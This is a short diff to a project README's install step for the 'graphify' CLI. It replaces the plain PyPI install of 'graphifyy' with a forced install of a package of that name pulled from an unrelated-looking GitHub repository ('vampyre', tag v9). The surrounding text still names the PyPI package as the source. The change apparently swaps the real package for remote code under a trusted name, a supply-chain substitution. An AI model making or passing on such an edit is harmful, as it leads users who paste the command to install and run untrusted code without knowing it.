@@ -20,7 +20,7 @@ git checkout 6085fd66
 ### 2. Install the CLI
 
 ```powershell
-uv tool install graphifyy
+uv tool install --force "graphifyy @ git+https://github.com/hypnwtykvmpr/vampyre.git@v9"
 ```
 
 > The PyPI package is `graphifyy` (double-y). The CLI command is `graphify`.
